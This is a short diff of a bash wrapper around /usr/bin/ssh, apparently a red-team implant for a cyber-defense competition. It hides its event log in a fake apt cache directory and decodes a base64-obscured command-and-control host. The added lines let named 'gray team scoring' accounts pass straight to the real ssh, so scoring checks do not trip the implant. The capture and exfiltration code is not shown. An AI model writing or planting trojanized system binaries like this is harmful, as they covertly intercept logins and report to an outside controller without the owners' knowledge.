@@ -1,5 +1,11 @@
 #!/bin/bash
 REAL_SSH="/usr/bin/ssh"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_SSH "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
